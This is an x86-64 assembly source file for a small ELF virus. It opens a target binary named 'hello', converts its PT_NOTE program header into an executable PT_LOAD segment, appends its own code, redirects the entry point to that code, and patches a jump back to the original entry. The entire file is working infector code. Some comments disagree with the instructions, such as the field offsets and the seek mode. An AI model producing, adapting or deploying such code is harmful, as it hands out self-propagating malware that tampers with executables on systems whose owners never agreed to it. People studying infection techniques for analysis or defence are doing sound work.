.text

.globl _start
.type start, @function
_start:
    //initialize stack frame
    push    %rbp
    movq    %rsp, %rbp

    //execute payload
    //string "Im a virus\n\0"
    sub     $12, %rsp
    movq    $0x61206d49, (%rsp)
    movq    $0x72697620, 4(%rsp)
    movq    $0x000a7375, 8(%rsp)
    //sys write
    xor     %eax, %eax
    movb    $1, %al
    //stdout
    xor     %edi, %edi 
    inc     %edi
    //buffer%
    movq    %rsp, %rsi
    //11 characters
    xor     %edx, %edx
    movb    $11, %dl
    syscall

    //filename "hello"
    movq    $0x6c6c6568, (%rsp)
    movq    $0x006f,  4(%rsp)
    //sys open
    xor     %rax, %rax
    movb    $2, %al
    //fname
    movq    %rsp, %rdi
    //mode RW
    xor     %rsi, %rsi
    movb    $2, %sil 

    xor     %rdx, %rdx
    syscall

    movq    $0xFF, %rdi
    cmp     $0, %eax
    js      Lexit     
    
    //save fd 
    movl    %eax, -4(%rbp)

    //fstat
    subq    $144, %rsp
    xor     %edi, %edi
    movb    %al, %dil
    movb    $5, %al
    movq    %rsp, %rsi
    syscall

    //save st_size
    movl    48(%rsp), %eax
    movl    %eax, -8(%rbp)

    //read elf header
    xor     %eax, %eax
    //fd
    movl    -4(%rbp), %edi 
    movq    %rsp, %rsi
    xor     %rdx, %rdx
    //size of elf header
    movb    $64, %dl
    syscall

    //save e_phoff
    movl    32(%rsp), %eax
    movl    %eax, -12(%rbp)
    //save e_phnum
    mov     56(%rsp), %ax
    mov     %ax, -14(%rbp)
    //save e_phentsize
    mov     54(%rsp), %ax
    mov     %ax, -16(%rbp)

    //lseek
    xor     %eax, %eax
    movb    $8, %al
    //fd
    movl    -4(%rbp), %edi
    xor     %esi, %esi
    xor     %edx, %edx
    //SEEK_SET
    movb    $2, %dl
    syscall
    //save eof
    movl    %eax, -20(%rbp)

    //for(int i = 0; i < phnum, i++)
    xor     %eax, %eax
    movl    %eax, -24(%rbp)
    Lstart_loop:
        //calculate phdr[i] offset
        movzwq  -24(%rbp), %r10
        //r10 *= e_phentsize
        movq    $56, %rbx
        imul    %rbx, %r10
        //r10 += e_phoff
        movzwq  -12(%rbp), %rbx
        add     %rbx, %r10
        //save offset
        movq    %r10, -32(%rbp)

        //pread64
        xor     %rax, %rax
        movq    $0, %rax
        movb    $17, %al 
        //fd
        xor     %rdi, %rdi
        movl    -4(%rbp), %edi
        movq    %rsp, %rsi
        //e_phentsize
        xor     %rdx, %rdx
        movb    $56, %dl
        syscall

        //take p_type (offset 0) and compare to PT_NOTE (4)
        movl    (%rsp), %eax
        cmpl    $4, %eax
        jne     Lcontinue
        //if(p_type == PT_NOTE)
            //p_type = PT_LOAD
            xor     %eax, %eax
            movb    $1, %al
            movl    %eax, (%rsp)
            //p_flags (offset 4) = PF_R + PF_X
            movb    $5, %al
            movl    %eax, 4(%rsp)
            //p_offset (offset 8) = eof
            movzwq  -20(%rbp), %rax
            movq    %rax, 8(%rsp)
            //p_vaddr (offset 24) = st_size + 0xc000000
            movzwq  -8(%rbp), %rax
            add     $0xc000000, %rax
            movq    %rax, 16(%rsp)
            //save vaddr
            movq    %rax, %r13
            //p_filesz (offset 32) = length of code
            xor     %rax, %rax
            lea     the_end(%rax), %rax
            lea     -_start(%rax), %rax
            movq    %rax, 32(%rsp)
            movq    %rax, %r15
            //p_memsz (offset 40) = p_filesz
            movq    %rax, 40(%rsp)
            //p_align (offset 48) = 0x200000
            movq    $0x200000, %rax
            movq    %rax, 48(%rsp)

            //write phdr
            xor     %rax, %rax
            movb    $18, %al
            //fd
            movl    -4(%rbp), %edi
            //buffer
            movq    %rsp, %rsi
            //size
            xor     %rdx, %rdx
            mov     -16(%rbp), %dx
            //offset
            movq    -32(%rbp), %r10
            syscall

            //write payload
            //calculate beginning with age old delta memory offset trick
            call .delta
            .delta:
                popq    %rax
            
            lea     _start(%rax), %rax
            lea     -.delta(%rax), %rsi
            //pwrite64
            xor     %rax, %rax
            movb    $18, %al
            //fd
            movzwq  -4(%rbp), %rdi
            //size
            movq    %r15, %rdx
            //offset (eof)
            movzwq  -20(%rbp), %r10
            syscall

            //load elf header and alter the entry point (pread64)
            xor     %eax, %eax
            movb    $17, %al
            //fd
            movl    -4(%rbp), %edi 
            movq    %rsp, %rsi
            xor     %rdx, %rdx
            //size of elf header
            movb    $64, %dl
            xor     %r10, %r10
            syscall

            //save original entry point
            movq    24(%rsp), %r14

            //calculate entry point
            movzwq  -8(%rbp), %rax
            add     $0xc000000, %rax
            //e_entry = %rax (offset 24)
            movq    %rax, 24(%rsp)

            //write elf header back (pwrite64)
            xor     %rax, %rax
            movb    $18, %al
            //fd
            movzwq  -4(%rbp), %rdi
            movq    %rsp, %rsi
            xor     %rdx, %rdx
            movb    $64, %dl
            xor     %r10, %r10
            syscall

            //put jmp original_entry at the end of infected file
            //calculate relative jmp addr
            //oentry - size - vaddr
            //jmp (addr) is 5B on (%rsp)
            sub     %r15, %r14
            sub     %r13, %r14
            movb    $0xe9, %al
            movb    %al, (%rsp)
            movq    %r14, %rax
            movl    %eax, 1(%rsp)
            //calculate offset to write
            movzwq  -20(%rbp), %rax
            add     %r15, %rax
            sub     $6, %rax
            movq    %rax, %r10
            //write (pwrite64)
            xor     %rax, %rax
            movb    $18, %al 
            movzwq  -4(%rbp), %rdi
            movq    %rsp, %rsi
            xor     %rdx, %rdx
            movb    $5, %dl
            syscall

            //close and exit
            movb    $3, %al
            movl    -4(%rbp), %edi
            syscall

            xor     %rdi, %rdi
            jmp Lexit

        Lcontinue:
        movl    -24(%rbp), %eax
        inc     %eax
        movl    %eax, -24(%rbp)
        cmp     -14(%rbp), %eax
        jl      Lstart_loop

    movq    $42, %rdi
    Lexit:
    movq    %rbp, %rsp
    popq    %rbp

    xor     %eax, %eax
    movb    $60, %al
    syscall
    
    the_end:



